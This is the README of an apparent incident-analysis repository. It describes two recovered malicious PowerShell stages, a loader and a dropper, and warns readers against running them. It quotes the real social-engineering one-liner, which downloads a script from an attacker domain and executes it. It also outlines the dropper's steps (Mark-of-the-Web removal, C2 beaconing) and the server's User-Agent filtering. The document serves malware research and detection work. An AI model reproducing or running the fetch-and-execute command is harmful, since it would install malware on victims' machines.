# ⚠️ Malicious PowerShell stages — DO NOT EXECUTE

This folder contains the **real, unmodified malicious PowerShell scripts** recovered directly from the attacker's infrastructure during this incident. They are kept here as raw evidence for research and detection-engineering purposes.

**Do not run these scripts.** Do not open them with a `.ps1`-associated editor that might offer to run them. Do not copy-paste their contents into a PowerShell prompt. If you need to execute anything in them for testing, do it **only** inside a disposable, network-isolated VM/sandbox you are prepared to wipe.

| File | What it is |
|---|---|
| [`stage1_loader.ps1`](stage1_loader.ps1) | The response returned by the first per-victim token URL (`dragonphoenixstar.cfd/<token>`). Spawns a second, hidden PowerShell process that fetches Stage 2 from a second per-victim token URL. |
| [`stage2_dropper.ps1`](stage2_dropper.ps1) | The actual dropper logic: downloads the password-protected `.7z` archive, downloads a portable `7z.exe` if the system doesn't have one, extracts the archive, removes the Mark-of-the-Web flag from the resulting executable, launches it silently, writes the infection marker, and beacons back to the C2 panel. |

## How these were obtained

The initial infection happened when the machine's owner was socially engineered into manually running the following command (see [`../analysis/01-initial-access.md`](../analysis/01-initial-access.md) for full context):

```powershell
powershell -c "$a=irm 'dragonphoenixstar.cfd/3MuK9PYWoflPRxG1';$h=@{ScriptBlock=[ScriptBlock]::Create($a);Name='s'};New-Module @h|Out-Null"
```

Both stage URLs are single-use, per-victim tokens (not static file names like `file.php`), but on this occasion they were still reachable when re-fetched hours later on a separate Linux (Debian) machine, using `curl` with a `User-Agent` string containing `WindowsPowerShell/5.1` (the server returns an HTTP 301 to a generic browser User-Agent instead of the payload — a basic filtering technique). No code was executed at any point on the Linux analysis machine; the scripts were only downloaded as text and read.
